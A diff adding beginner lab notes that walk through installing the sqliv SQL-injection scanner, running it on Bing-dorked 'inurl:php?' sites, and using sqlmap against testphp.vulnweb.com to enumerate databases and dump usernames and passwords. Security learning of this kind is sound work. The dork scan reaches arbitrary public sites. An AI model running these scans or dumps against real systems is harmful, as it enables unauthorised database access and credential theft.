@@ -1,0 +1,24 @@
+First install sqliv (this is going to be a pain)
+	cd /home/kali
+	wget https://bootstrap.pypa.io/get-pip.py
+	sudo python2 get-pip.py
+Hopefully that works
+	
+Now git clone
+	git clone https://github.com/Hadesy2k/sqliv.git
+now cd to sqliv
+	from here sudo python setup.py
+		should start setup
+	now lets run a vulnerability scan
+python sqliv.py -d "inurl:php?" -e bing -p 100
+	we have a site we know is legal to do this to
+http://testphp.vulnweb.com/artists.php?artist=1
+	lets see if we can start to see inside the database for this site
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs
+we found some databases, lets take a look into acuart
+	sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables
+	sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns
+	sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump
+	sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass --dump
+
+
